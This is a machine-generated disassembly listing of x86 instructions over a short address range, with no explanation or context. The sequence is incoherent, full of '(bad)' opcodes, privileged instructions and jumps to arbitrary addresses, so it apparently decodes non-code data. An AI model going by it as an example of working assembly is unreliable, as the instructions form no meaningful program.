  404a0c:	inc    edi
  404a0d:	push   ebx
  404a0e:	pop    ecx
  404a0f:	sub    DWORD PTR [edi],eax
  404a11:	mov    ds:0xbf1d61cd,eax
  404a16:	enter  0x6bf4,0x39
  404a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a1b:	nop
  404a1c:	test   esp,0xd27c22b9
  404a22:	and    eax,0x2963554a
  404a27:	(bad)  
  404a28:	mov    al,0xbe
  404a2a:	lods   al,BYTE PTR ds:[esi]
  404a2b:	cli    
  404a2c:	sub    al,0xd9
  404a2e:	repz cmp al,0x35
  404a31:	pop    ebx
  404a32:	popf   
  404a33:	ins    DWORD PTR es:[edi],dx
  404a34:	popa   
  404a35:	bound  edi,QWORD PTR [edi+0x61]
  404a38:	xchg   esp,eax
  404a39:	sbb    ebp,ecx
  404a3b:	rcl    ch,cl
  404a3d:	inc    eax
  404a3e:	jne    0x404a3a
  404a40:	inc    edx
  404a41:	jmp    0x8d04f6fc
  404a46:	fst    DWORD PTR [esi-0x739245f3]
  404a4c:	dec    eax
  404a4d:	mov    ds:0x9a0f140d,eax
  404a52:	jbe    0x4049ec
  404a54:	xchg   ecx,eax
  404a55:	sub    BYTE PTR [edx+0x71b88eda],cl
  404a5b:	jbe    0x404a9b
  404a5d:	sbb    dl,BYTE PTR [eax+eiz*1-0x1e7f8985]
  404a64:	out    0xfc,eax
  404a66:	popa   
  404a67:	jnp    0x404a89
  404a69:	or     dh,BYTE PTR [ecx+0x31568260]
  404a6f:	in     al,0xbe
  404a71:	pushf  
  404a72:	xchg   edx,eax
  404a73:	into   
  404a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a75:	out    0xbb,eax
  404a77:	aaa    
  404a78:	mov    esi,0x22a1272c
  404a7d:	loopne 0x404ab6
  404a7f:	jae    0x404a5b
  404a81:	xlat   BYTE PTR ds:[ebx]
  404a82:	test   al,0x6
  404a84:	jbe    0x404ab2
  404a86:	mov    ch,0x21
  404a88:	jns    0x404a55
  404a8a:	mov    esi,0x2b3ab2a4
  404a8f:	ins    DWORD PTR es:[edi],dx
  404a90:	mov    ss,WORD PTR [edi+0x53]
  404a93:	xchg   BYTE PTR [ecx-0x5dfe9830],dh
  404a99:	mov    esi,0x26c7fc5b
  404a9e:	sbb    al,0x4a
  404aa0:	add    dl,BYTE PTR [eax+0x21]
  404aa3:	sahf   
  404aa4:	pop    ecx
  404aa5:	inc    ebx
  404aa6:	sahf   
  404aa7:	test   DWORD PTR [edi+0x7e],edi
  404aaa:	ret    
  404aab:	xchg   ebx,eax
  404aac:	inc    edi
  404aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aae:	dec    esi
  404aaf:	dec    edx
  404ab0:	xor    DWORD PTR [edi-0x7f],edi
  404ab3:	imul   DWORD PTR [esi+0x64]
  404ab6:	dec    edi
  404ab7:	call   0x1246:0x1600ab02
  404abe:	lods   eax,DWORD PTR ds:[esi]
  404abf:	add    dh,BYTE PTR [edi+edx*2+0x54]
  404ac3:	neg    BYTE PTR [edi-0x36]
  404ac6:	add    DWORD PTR [eax+0x226cac7a],esp
  404acc:	mov    ebp,0x3260450
  404ad1:	gs sbb al,bh
  404ad4:	pop    esi
  404ad5:	dec    edx
  404ad6:	ret    
  404ad7:	xlat   BYTE PTR ds:[ebx]
  404ad8:	mov    dl,0x2f
  404ada:	scas   eax,DWORD PTR es:[edi]
  404adb:	hlt    
  404adc:	xor    al,0xf7
  404ade:	into   
  404adf:	test   al,0x92
  404ae1:	xor    DWORD PTR ds:0x2cabd06,ecx
  404ae7:	sahf   
  404ae8:	mov    ebx,0xab143e5f
  404aed:	int    0xdb
  404aef:	stos   DWORD PTR es:[edi],eax
  404af0:	fcom   QWORD PTR [eax+eiz*8+0x2d]
  404af4:	test   DWORD PTR [esi+edx*2],esp
  404af7:	pusha  
  404af8:	sbb    al,0x53
  404afa:	xchg   edi,eax
  404afb:	push   esi
  404afc:	adc    BYTE PTR [ebp+0x26e752ac],ch
  404b02:	mov    ebp,0x3cbe9b13
  404b07:	or     ebx,DWORD PTR [ebp+0x39]
  404b0a:	inc    edi
  404b0b:	and    eax,0xdfdec2ca
  404b10:	sub    eax,0x3386dfc1
  404b15:	outs   dx,DWORD PTR ds:[esi]
  404b16:	popa   
  404b17:	cmp    BYTE PTR [eax+0x7],0xf9
  404b1b:	pop    DWORD PTR [eax-0x8cfccac]
  404b21:	ins    BYTE PTR es:[edi],dx
  404b22:	lods   eax,DWORD PTR ds:[esi]
  404b23:	aam    0x18
  404b25:	jmp    0x8afe:0xb95c3597
  404b2c:	jl     0x404b23
  404b2e:	xor    DWORD PTR [edx],0x6d
  404b31:	enter  0xfb82,0xb4
  404b35:	inc    ebx
  404b36:	shl    esi,0x7a
  404b39:	xor    DWORD PTR [edi],esp
  404b3b:	and    eax,0xf3a33b6
  404b40:	mov    dh,0x1a
  404b42:	repz in eax,0xf9
  404b45:	mov    BYTE PTR [eax-0x7af033fe],ah
  404b4b:	pop    esp
  404b4c:	mov    dh,BYTE PTR [edx+0x2a53193b]
  404b52:	push   0x71ec9119
  404b57:	xchg   ecx,eax
  404b58:	shl    BYTE PTR [ebp+0x2b],1
  404b5b:	call   0x3b7d:0x91bd53e4
  404b62:	mov    ?,WORD PTR [edx-0xe]
  404b65:	xchg   esp,eax
  404b66:	and    DWORD PTR [ecx],0xffffffd7
  404b69:	(bad)  
  404b6a:	stos   DWORD PTR es:[edi],eax
  404b6b:	test   al,0xc2
  404b6d:	std    
  404b6e:	mov    bl,dl
  404b70:	dec    edi
  404b71:	sub    BYTE PTR ds:0x51e831d2,al
  404b77:	ret    0xcb66
  404b7a:	int3   
  404b7b:	push   eax
  404b7c:	mov    edx,0x8e053b1c
  404b81:	cmp    al,0xec
  404b83:	aaa    
  404b84:	xchg   esp,eax
  404b85:	xor    bl,BYTE PTR [eax+ebp*4]
  404b88:	in     al,dx
  404b89:	inc    esp
  404b8a:	inc    ebp
  404b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b8c:	mov    edi,0xc783cbf
  404b91:	retf   0x3566
  404b94:	adc    DWORD PTR [edi+0x5b],0xbfc7c032
  404b9b:	mul    DWORD PTR [ebx]
  404b9d:	pop    ds
  404b9e:	inc    edx
  404b9f:	imul   ebx,edx,0xffffffe2
  404ba2:	sbb    BYTE PTR [ecx+0x301619b5],dh
  404ba8:	aam    0x84
  404baa:	or     ebp,ecx
  404bac:	into   
  404bad:	pop    ss
  404bae:	jae    0x404b7b
  404bb0:	mov    dl,0xb0
  404bb2:	test   al,0x87
  404bb4:	jl     0x404c07
  404bb6:	fild   QWORD PTR [edi-0x44]
  404bb9:	fwait
  404bba:	adc    eax,0x742f3667
  404bbf:	loop   0x404c30
  404bc1:	sti    
  404bc2:	hlt    
  404bc3:	cdq    
  404bc4:	sbb    DWORD PTR [ebp-0x273329e4],0xa8f70687
  404bce:	std    
  404bcf:	pusha  
  404bd0:	mov    dh,0x98
  404bd2:	push   ecx
  404bd3:	dec    ecx
  404bd4:	add    DWORD PTR [esi],ebp
  404bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bd7:	in     al,dx
  404bd8:	cdq    
  404bd9:	push   ebp
  404bda:	sub    esi,DWORD PTR [eax-0x35]
  404bdd:	and    al,0x23
  404bdf:	mov    dl,0xe6
  404be1:	call   0x372cd59a
  404be6:	stc    
  404be7:	into   
  404be8:	cs pop eax
  404bea:	xor    DWORD PTR [ecx],0xa6e08249
  404bf0:	cmp    edx,DWORD PTR [edx-0xf]
  404bf3:	inc    eax
  404bf4:	lods   eax,DWORD PTR ds:[esi]
  404bf5:	sbb    BYTE PTR [edi],dl
  404bf7:	leave  
  404bf8:	arpl   WORD PTR [edi],bx
  404bfa:	cmp    cl,BYTE PTR [ecx]
  404bfc:	mov    bl,0x88
  404bfe:	call   0x2cd99c32
  404c03:	stos   DWORD PTR es:[edi],eax
  404c04:	iret   
  404c05:	jae    0x404bc6
  404c07:	sahf   
  404c08:	push   eax
  404c09:	mov    ecx,0xe436ce42
  404c0e:	ret    
  404c0f:	das    
  404c10:	sub    esp,DWORD PTR [esi-0x1463341d]
  404c16:	mov    DWORD PTR [ebp+0x30],ecx
  404c19:	pavgb  mm5,QWORD PTR [ecx]
  404c1c:	cmp    BYTE PTR [edx+eiz*4],0x84
  404c20:	cmp    eax,0x4861fbb8
  404c25:	sbb    DWORD PTR [esi-0x67],edx
  404c28:	fcmovnb st,st(7)
  404c2a:	sbb    DWORD PTR [ebx+edx*2+0x25],edi
  404c2e:	into   
  404c2f:	pop    ebx
  404c30:	sub    eax,DWORD PTR [eax]
  404c32:	jl     0x404ca4
  404c34:	scas   al,BYTE PTR es:[edi]
  404c35:	fld    QWORD PTR [edi-0x64]
  404c38:	mov    dh,0x56
  404c3a:	arpl   cx,ax
  404c3c:	mov    esp,0x5bc5ad25
  404c41:	lahf   
  404c42:	outs   dx,DWORD PTR ds:[esi]
  404c43:	inc    esi
  404c44:	loope  0x404c60
  404c46:	add    eax,0x21f2ebba
  404c4b:	sub    ebx,DWORD PTR [eax]
  404c4d:	jbe    0x404c51
  404c4f:	sbb    al,0x56
  404c51:	jmp    0xa2758cae
  404c56:	add    ebp,DWORD PTR [ebp-0x63]
  404c59:	test   BYTE PTR [edx-0x1e92ff4],dl
  404c5f:	sti    
  404c60:	push   esp
  404c61:	and    DWORD PTR [ecx],ebp
  404c63:	adc    eax,0xd904a094
  404c68:	(bad)  
  404c69:	test   BYTE PTR [esi-0x4b686b03],0xa9
  404c70:	jae    0x404cb7
  404c72:	out    0x98,eax
  404c74:	dec    esp
  404c75:	int3   
  404c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c77:	sti    
  404c78:	das    
  404c79:	fs push ecx
  404c7b:	jmp    0xe2a0:0xbd417296
  404c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c83:	mov    BYTE PTR [edx-0x74],bl
  404c86:	mov    DWORD PTR [edi-0x45],ebp
  404c89:	scas   al,BYTE PTR es:[edi]
  404c8a:	and    ah,al
  404c8c:	ss sbb eax,0x90075ad3
  404c92:	mov    DWORD PTR [edi],ebp
  404c94:	and    al,0xf3
  404c96:	push   ecx
  404c97:	mov    al,0x1c
  404c99:	(bad)  
  404c9a:	inc    esi
  404c9b:	cmp    edx,DWORD PTR [eax-0x4dcd34a8]
  404ca1:	loope  0x404ce1
  404ca3:	ror    DWORD PTR [edx-0x2af9bf4a],1
  404ca9:	je     0x404c6a
  404cab:	sub    DWORD PTR ds:0x8e0fa2db,esp
  404cb1:	mov    BYTE PTR [ebp+0x2a396fac],ch
  404cb7:	lds    ecx,FWORD PTR [edx+0x3afa300f]
  404cbd:	sub    ah,dl
  404cbf:	mov    edi,0xa553c1df
  404cc4:	pop    ebx
  404cc5:	call   FWORD PTR [ebx-0x50f34333]
  404ccb:	and    esp,DWORD PTR [ebx]
  404ccd:	aam    0xa5
  404ccf:	lds    ecx,FWORD PTR [esi-0x65]
  404cd2:	cmp    ah,BYTE PTR [ecx-0x1d1e938d]
  404cd8:	xor    eax,0x2118353b
  404cdd:	and    ebx,DWORD PTR ds:0xfd159871
  404ce3:	cmp    eax,0x150693db
  404ce8:	in     eax,0x3e
  404cea:	pop    es
  404ceb:	retf   0x7dcc
  404cee:	xchg   ecx,edi
  404cf0:	scas   eax,DWORD PTR es:[edi]
  404cf1:	and    eax,0x5644730d
  404cf6:	(bad)  
  404cf7:	cli    
  404cf8:	mov    ecx,ds
  404cfa:	sub    DWORD PTR [ebx-0x4cd6933],edx
  404d00:	std    
  404d01:	hlt    
  404d02:	lahf   
  404d03:	shl    DWORD PTR [edi],1
  404d05:	(bad)  
  404d06:	ins    DWORD PTR es:[edi],dx
  404d07:	adc    DWORD PTR [edi-0x2c],0xb207c552
  404d0e:	dec    ebp
  404d0f:	dec    esi
  404d10:	cdq    
  404d11:	lods   al,BYTE PTR ds:[esi]
  404d12:	iret   
  404d13:	xor    DWORD PTR [eax+0x5111e08],esi
  404d19:	test   BYTE PTR [ebx+eax*4],0x75
  404d1d:	shr    cl,1
  404d1f:	sbb    al,0x3a
  404d21:	std    
  404d22:	pop    eax
  404d23:	data16 adc BYTE PTR [ebx+edi*8],ah
  404d27:	jbe    0x404cea
  404d29:	dec    esp
  404d2a:	xor    DWORD PTR [ebp-0x4aae574e],eax
  404d30:	sub    BYTE PTR [eax-0x4b32e655],0xc
  404d37:	mov    bh,0x9b
  404d39:	or     BYTE PTR [ebx],ah
  404d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d3c:	mov    ch,0xe7
  404d3e:	xor    BYTE PTR [esi],0xb0
  404d41:	or     BYTE PTR [ebp+0x374f23f],cl
  404d47:	and    DWORD PTR [esi-0x72],eax
  404d4a:	loop   0x404d71
  404d4c:	ins    DWORD PTR es:[edi],dx
  404d4d:	nop
  404d4e:	idiv   DWORD PTR [esi-0x3da9a7be]
  404d54:	les    esp,FWORD PTR [edi-0x2f]
  404d57:	aam    0xb5
  404d59:	push   0x74567290
  404d5e:	retf   
  404d5f:	lds    esp,FWORD PTR [esi+0x684ce763]
  404d65:	xor    al,0x3f
  404d67:	scas   al,BYTE PTR es:[edi]
  404d68:	retf   0x980b
  404d6b:	push   edx
  404d6c:	push   ebx
  404d6d:	in     eax,dx
  404d6e:	aad    0xb2
  404d70:	jno    0x404d2c
  404d72:	xchg   ebx,eax
  404d73:	mov    ah,0x8e
  404d75:	jle    0x404d0b
  404d77:	inc    esi
  404d78:	mov    ebp,eax
  404d7a:	jno    0x404d2c
  404d7c:	or     BYTE PTR [ebx],dh
  404d7e:	mul    DWORD PTR [eax]
  404d80:	fsubr  QWORD PTR [ebx-0x305d63dc]
  404d86:	sahf   
  404d87:	sub    cl,BYTE PTR [edi+0x20998eb9]
  404d8d:	fwait
  404d8e:	jle    0x404d5c
  404d90:	or     DWORD PTR [esi+0x5f70bcd],ebx
  404d96:	cmp    edi,DWORD PTR [eax-0x32fe5f45]
  404d9c:	mov    ch,0x41
  404d9e:	push   edx
  404d9f:	and    al,0x92
  404da1:	aam    0x76
  404da3:	int3   
  404da4:	xchg   ecx,eax
  404da5:	call   0xd2aa:0x4aba11c2
  404dac:	mov    DWORD PTR [ecx+0x55],esi
  404daf:	ret    0x9583
  404db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404db3:	stc    
  404db4:	sbb    ebx,eax
  404db6:	pusha  
  404db7:	into   
  404db8:	scas   al,BYTE PTR es:[edi]
  404db9:	sub    bl,BYTE PTR [bp+si-0x23]
  404dbd:	xor    ch,al
  404dbf:	or     DWORD PTR [eax+0x3b],edi
  404dc2:	fwait
  404dc3:	mov    bl,0xb3
  404dc5:	scas   al,BYTE PTR es:[edi]
  404dc6:	into   
  404dc7:	aam    0x23
  404dc9:	lds    esp,FWORD PTR ds:[eax+0x6ead17ad]
  404dd0:	jmp    0x215df235
  404dd5:	mov    ds:0x1f570e06,eax
  404dda:	(bad)  
  404ddc:	aas    
  404ddd:	imul   esp,DWORD PTR [eax+0x75],0x1b
  404de1:	mov    edi,0xa06477ee
  404de6:	push   ebp
  404de7:	xchg   DWORD PTR [ebp+0x3bb2171d],edi
  404ded:	add    eax,0x6d9e5d71
  404df2:	mov    esi,0x6adfce3c
  404df7:	ins    DWORD PTR es:[edi],dx
  404df8:	xchg   ebp,eax
  404df9:	test   al,0x9e
  404dfb:	(bad)  
  404dfc:	daa    
  404dfd:	retf   0xd14f
  404e00:	outs   dx,DWORD PTR ds:[esi]
  404e01:	mov    edx,0x2d2b1767
  404e06:	int3   
  404e07:	pop    edx
  404e08:	mov    esp,0x6a22c87f
  404e0d:	xor    al,0x7a
  404e0f:	fdiv   DWORD PTR [ecx-0x7b]
  404e12:	sub    BYTE PTR ds:[eax],0xa8
  404e16:	cmc    
  404e17:	add    al,0x6
  404e19:	outs   dx,BYTE PTR ds:[esi]
  404e1a:	loop   0x404dcb
  404e1c:	std    
  404e1d:	stc    
  404e1e:	rcr    BYTE PTR [edx+0x79],1
  404e21:	sub    eax,0x26150cd
  404e26:	xchg   esp,eax
  404e27:	jmp    0x5067dd1a
  404e2c:	mov    BYTE PTR [eax],dl
  404e2e:	xchg   esp,eax
  404e2f:	xchg   edx,eax
  404e30:	aam    0xcf
  404e32:	mov    edi,0xd952c26c
  404e37:	dec    eax
  404e38:	dec    esp
  404e39:	adc    al,0xaa
  404e3b:	test   BYTE PTR [edx+0x68],dl
  404e3e:	jae    0x404e7a
  404e40:	dec    ebx
  404e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e42:	sbb    DWORD PTR ds:[ecx+esi*8-0xfff97a9],esi
  404e4a:	cmp    al,0x74
  404e4c:	jns    0x404e3f
  404e4e:	ins    BYTE PTR es:[edi],dx
  404e4f:	jbe    0x404ecb
  404e51:	popf   
  404e52:	(bad)  
  404e53:	out    dx,eax
  404e54:	push   0xffffff94
  404e56:	jge    0x404eaa
  404e58:	dec    eax
  404e59:	xor    DWORD PTR [edx+0x6f8ca05f],0xa71c0e6b
  404e63:	push   eax
  404e64:	ret    
  404e65:	mov    esi,0x4ddeb319
  404e6a:	xor    edi,ebp
  404e6c:	mov    edi,0xaf3ddcfb
  404e71:	adc    esi,DWORD PTR [ecx+edx*1]
  404e74:	frstor [ebp+0x20]
  404e77:	cld    
  404e78:	icebp  
  404e79:	jp     0x404e91
  404e7b:	inc    eax
  404e7c:	xchg   esp,eax
  404e7d:	add    DWORD PTR [esi-0x72a83375],eax
  404e83:	mov    dh,0xc6
  404e85:	aas    
  404e86:	inc    esi
  404e87:	fst    QWORD PTR [esi-0x6a36bfab]
  404e8d:	adc    esp,ebp
  404e8f:	add    dl,BYTE PTR ds:0xb89761ec
  404e95:	jae    0x404eef
  404e97:	(bad)  
  404e99:	in     eax,dx
  404e9a:	push   eax
  404e9b:	jge    0x404e83
  404e9d:	adc    BYTE PTR [esi],ah
  404e9f:	mov    ?,eax
  404ea1:	icebp  
  404ea2:	jnp    0x404ec6
  404ea4:	(bad)  
  404ea6:	stos   DWORD PTR es:[edi],eax
  404ea7:	enter  0xf740,0x80
  404eab:	gs push ss
  404ead:	(bad)  
  404eaf:	loopne 0x404ede
  404eb1:	scas   eax,DWORD PTR es:[edi]
  404eb2:	mov    ecx,DWORD PTR [esi]
  404eb4:	sub    al,0xb9
  404eb6:	adc    ah,cl
  404eb8:	fidivr DWORD PTR [eax+edx*1-0x4552bb67]
  404ebf:	inc    ecx
  404ec0:	aam    0x8a
  404ec2:	stc    
  404ec3:	icebp  
  404ec4:	into   
  404ec5:	push   es
  404ec6:	and    bh,ah
  404ec8:	cmp    eax,edi
  404eca:	pop    esi
  404ecc:	mov    BYTE PTR [ebx+ecx*4+0x5035b136],cl
  404ed3:	pop    ebp
  404ed4:	push   DWORD PTR [ebp-0x1c]
  404ed7:	mov    esp,0xec8b4a01
  404edc:	push   ebx
  404edd:	ds jl  0x404f34
  404ee0:	cmp    BYTE PTR [esi-0x56a5fcfc],dl
  404ee6:	jp     0x404e6a
  404ee8:	ret    0xea8a
  404eeb:	dec    eax
  404eec:	push   edx
  404eed:	jge    0x404f15
  404eef:	and    esp,0xffffffcd
  404ef2:	pop    ebp
  404ef3:	jne    0x404ef5
  404ef5:	or     bl,BYTE PTR [edi]
  404ef7:	pop    es
  404ef8:	cmp    eax,0xa1852766
  404efd:	pop    ebx
  404efe:	lock fld TBYTE PTR [eax-0x80]
  404f02:	inc    ecx
  404f03:	clc    
  404f04:	push   edx
  404f05:	mov    ?,WORD PTR [ecx+ebx*2+0x58]
  404f09:	and    edi,DWORD PTR [edx-0x781194c5]
  404f0f:	jg     0x404f21
  404f11:	out    0xcc,al
  404f13:	mov    ?,ebx
  404f15:	jbe    0x404f6b
  404f17:	adc    ebp,DWORD PTR [edi+0x3baf6e31]
  404f1d:	popa   
  404f1e:	iret   
  404f1f:	inc    ecx
  404f20:	mov    esi,ebx
  404f22:	stos   BYTE PTR es:[edi],al
  404f23:	mov    ch,0xc2
  404f25:	cli    
  404f26:	pop    ss
  404f27:	ror    DWORD PTR [ecx-0x57],cl
  404f2a:	je     0x404eee
  404f2c:	mov    al,ds:0x2eaaa1e
  404f31:	xchg   edi,eax
  404f32:	xchg   ecx,eax
  404f33:	cdq    
  404f34:	icebp  
  404f35:	adc    esi,eax
  404f37:	add    edx,DWORD PTR [esi-0x3cb80169]
  404f3d:	dec    ebp
  404f3e:	fcmovb st,st(4)
  404f40:	dec    edi
  404f41:	inc    eax
  404f42:	aam    0x91
  404f44:	leave  
  404f45:	ss jmp 0x404f57
  404f48:	jecxz  0x404f71
  404f4a:	add    eax,0x88d8d0d2
  404f4f:	pop    ebx
  404f50:	data16 (bad) [ebx]
  404f53:	inc    edi
  404f54:	push   esp
  404f55:	inc    ecx
  404f56:	es into 
  404f58:	adc    ebx,DWORD PTR [ebp-0x65e0558c]
  404f5e:	enter  0x6b73,0x48
  404f62:	sahf   
  404f63:	test   al,0x6d
  404f65:	add    ah,dh
  404f67:	add    ebp,DWORD PTR [edi-0x2f0d303a]
  404f6d:	xchg   edi,eax
  404f6e:	adc    eax,ecx
  404f70:	scas   eax,DWORD PTR es:[edi]
  404f71:	pop    ebp
  404f72:	and    DWORD PTR [edx+0x2],esp
  404f75:	loopne 0x404fbc
  404f77:	fist   WORD PTR [edx-0x34dda433]
  404f7d:	(bad)  
  404f7e:	xor    DWORD PTR [eax+0x47f62683],ebx
  404f84:	and    BYTE PTR ds:0xe55e300c,bh
  404f8a:	loope  0x404f7e
  404f8c:	mov    edx,0xfc87c2a
  404f91:	cs mov bl,0x15
  404f94:	inc    edx
  404f95:	clc    
  404f96:	std    
  404f97:	neg    BYTE PTR cs:[edi-0x1d21b6ef]
  404f9e:	dec    ebp
  404f9f:	rol    DWORD PTR [edx],0xa5
  404fa2:	stos   DWORD PTR es:[edi],eax
  404fa3:	daa    
  404fa4:	push   edx
  404fa5:	sub    DWORD PTR [edi+0x2bbec43a],0x66094f7a
  404faf:	cmp    al,0x4e
  404fb1:	aam    0xe6
  404fb3:	fld    DWORD PTR cs:[eax]
  404fb6:	leave  
  404fb7:	fs jecxz 0x405026
  404fba:	int3   
  404fbb:	or     al,0xfe
  404fbd:	xchg   edx,eax
  404fbe:	ins    DWORD PTR es:[edi],dx
  404fbf:	popf   
  404fc0:	add    ah,dl
  404fc2:	ffreep st(6)
  404fc4:	mov    edi,0x407e7fba
  404fc9:	inc    ebx
  404fca:	shl    BYTE PTR [ebp+0x2e],cl
  404fcd:	test   eax,0xd9a6c164
  404fd2:	outs   dx,BYTE PTR ds:[esi]
  404fd3:	push   edi
  404fd4:	retf   0x677
  404fd7:	cmc    
  404fd8:	in     eax,0x34
  404fda:	ds js  0x404fbb
  404fdd:	and    DWORD PTR [edi+0x2b],0xa67dd61a
  404fe4:	mov    bl,0x19
  404fe6:	stc    
  404fe7:	sub    BYTE PTR [ebx+ebp*2],al
  404fea:	jnp    0x405002
  404fec:	and    dh,BYTE PTR [ebx-0x543d4fbe]
  404ff2:	jp     0x404ffe
  404ff4:	xchg   ch,cl
  404ff6:	jmp    0x405022
  404ff8:	dec    ecx
  404ff9:	test   DWORD PTR [ecx+edi*8-0x6b16b838],ecx
  405000:	push   esp
  405001:	std    
  405002:	jmp    0x6bdb:0xe3f4ff31
  405009:	ins    BYTE PTR es:[edi],dx
  40500a:	and    al,ah
  40500c:	js     0x40500d
  40500e:	jle    0x404fc2
  405010:	inc    edx
  405011:	xor    dh,BYTE PTR [ebp-0x4ddc2703]
  405017:	push   0x12e58db3
  40501c:	movntq QWORD PTR [ebp-0x13],mm1
  405020:	pop    ebp
  405021:	cmp    BYTE PTR [ebx+edx*4-0x32],dh
  405025:	sti    
  405026:	mov    edx,0xfc1038cb
  40502b:	mov    cl,ah
  40502d:	enter  0xd473,0xc5
  405031:	aas    
  405032:	xchg   ebp,eax
  405033:	rcr    DWORD PTR [ebp+0x1a498a4a],cl
  405039:	pop    es
  40503a:	loop   0x404fde
  40503c:	leave  
  40503d:	test   eax,0x4e546854
  405042:	sbb    BYTE PTR [edx-0x9],dl
  405045:	iret   
  405046:	inc    eax
  405047:	xchg   BYTE PTR [ebp+edx*2+0x4f],dl
  40504b:	shl    eax,1
  40504d:	push   esi
  40504e:	xlat   BYTE PTR ds:[ebx]
  40504f:	mov    edx,0x8ca8530d
  405054:	push   0x581fd20d
  405059:	call   0x1758d90
  40505e:	addr16 fwait
  405060:	inc    eax
  405061:	xchg   esp,eax
  405062:	push   ebx
  405063:	mov    ds:0xed1a598d,eax
  405068:	mov    fs:0xea058d9a,al
  40506e:	ret    0x51bc
  405071:	clts   
  405073:	lock jae 0x4050a6
  405076:	xor    al,0x91
  405078:	sub    eax,0xe478867
  40507d:	mov    esp,0x4eebc371
  405082:	sub    ebp,edi
  405084:	enter  0xb642,0x74
  405088:	enter  0xda30,0xa4
  40508c:	cmp    al,0x57
  40508e:	cmc    
  40508f:	imul   ecx,DWORD PTR [esi+0x3ccf48ef],0x73
  405096:	fsubr  st(1),st
  405098:	adc    eax,0xd9fbf1f0
  40509d:	sbb    eax,0xce75c175
  4050a2:	in     eax,0x65
  4050a4:	pop    edx
  4050a5:	jmp    0xfd21:0x6f64449a
  4050ac:	mov    al,ds:0x1492e5a
  4050b1:	cmp    eax,0xa56d302a
  4050b6:	cmp    DWORD PTR [ebp-0x7521fa60],ebp
  4050bc:	enter  0x6822,0xee
  4050c0:	mov    edx,0xdd7afbe6
  4050c5:	mov    al,ds:0xae6f1e94
  4050ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050cb:	lods   eax,DWORD PTR ds:[esi]
  4050cc:	(bad)  
  4050cd:	xor    eax,DWORD PTR [ebx-0x4e]
  4050d0:	ja     0x405063
  4050d2:	push   eax
  4050d3:	cli    
  4050d4:	popa   
  4050d5:	mov    dh,0x22
  4050d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050d8:	and    BYTE PTR [edi+0x573ceb9f],cl
  4050de:	idiv   DWORD PTR [edx+eiz*2-0x30]
  4050e2:	not    BYTE PTR [eax-0x61b07827]
  4050e8:	mov    eax,ds:0x5ec50bc6
  4050ed:	sub    eax,DWORD PTR [eax+eiz*2]
  4050f0:	mov    esi,0xeb4cbfc7
  4050f5:	popf   
  4050f6:	int    0xf9
  4050f8:	pusha  
  4050f9:	fadd   DWORD PTR [ebp+0x43]
  4050fc:	xor    DWORD PTR [edx+0x31210b27],esi
  405102:	or     BYTE PTR [edx-0x5f288dc5],cl
  405108:	xchg   edx,eax
  405109:	xchg   ebx,eax
  40510a:	xor    eax,0x15913793
  40510f:	sub    al,0x8a
  405111:	pop    eax
  405112:	jno    0x405109
  405114:	mov    ch,al
  405116:	call   0x1754:0x2d8553bf
  40511d:	pop    edi
  40511e:	rcr    cl,1
  405120:	ins    DWORD PTR es:[edi],dx
  405121:	mov    ebx,0xc9e486d3
  405126:	sahf   
  405127:	loopne 0x405125
  405129:	cmp    ebx,0xae9c1724
  40512f:	cs (bad) 
  405131:	shr    BYTE PTR [esp+ebx*8],cl
  405134:	sub    eax,0x7120980a
  405139:	push   ecx
  40513a:	fnstcw WORD PTR [edi]
  40513c:	xchg   DWORD PTR [esp+eiz*8+0x645f4232],ecx
  405143:	cmp    DWORD PTR [edx+0x4f36f259],eax
  405149:	(bad)  
  40514a:	neg    BYTE PTR [ebp-0x2aed4a22]
  405150:	jno    0x405191
  405152:	int    0xcb
  405154:	and    BYTE PTR [edx+0x537b8c28],dh
  40515a:	jl     0x40516a
  40515c:	or     ecx,DWORD PTR [eax+ebp*2+0x21cf4dd2]
  405163:	aam    0x23
  405165:	je     0x4051c4
  405167:	das    
  405168:	mov    ebp,0xb6106044
  40516d:	pop    ds
  40516e:	adc    al,0xae
  405170:	pop    esi
  405171:	out    0xd8,eax
  405173:	and    BYTE PTR [esi-0x5f],al
  405176:	sub    al,0xd1
  405178:	rcl    BYTE PTR [edi+0x5c],0x1a
  40517c:	push   0xffffffd1
  40517e:	gs ds fld st(3)
  405182:	leave  
  405183:	pop    esp
  405184:	retf   0x8abd
  405187:	push   ecx
  405188:	inc    ecx
  405189:	(bad)  
  40518a:	xor    al,0x96
  40518c:	scas   eax,DWORD PTR es:[edi]
  40518d:	sar    BYTE PTR [edi+eiz*1-0x22e02658],cl
  405194:	aas    
  405195:	jne    0x4051d8
  405197:	mov    eax,0x553d5936
  40519c:	adc    ebx,0x27
  40519f:	xor    dl,BYTE PTR [ebp+ebp*8+0x3bee13e4]
  4051a6:	push   cs
  4051a7:	fld    DWORD PTR [esi-0x6a]
  4051aa:	mov    BYTE PTR [edi+0x30],dl
  4051ad:	mov    ?,WORD PTR [ebp+0x4327308e]
  4051b3:	push   ss
  4051b4:	and    BYTE PTR [edi-0xb783ce8],ah
  4051ba:	popa   
  4051bb:	jp     0x4051ab
  4051bd:	cmp    ecx,esi
  4051bf:	xor    BYTE PTR [esi+0x749835fa],0x6a
  4051c6:	jmp    0x23d2:0x2984585f
  4051cd:	inc    edi
  4051ce:	call   0xec90fdaa
  4051d3:	test   DWORD PTR [edx+0x75],edx
  4051d6:	jno    0x4051be
  4051d8:	das    
  4051d9:	repnz adc dh,BYTE PTR [ecx]
  4051dc:	ins    DWORD PTR es:[edi],dx
  4051dd:	xchg   edi,eax
  4051de:	sub    eax,ecx
  4051e0:	xlat   BYTE PTR ds:[ebx]
  4051e1:	sub    BYTE PTR [ebx],ch
  4051e3:	imul   edi,DWORD PTR [edx],0x1b73e376
  4051e9:	inc    edx
  4051ea:	pop    edx
  4051eb:	pusha  
  4051ec:	(bad)  
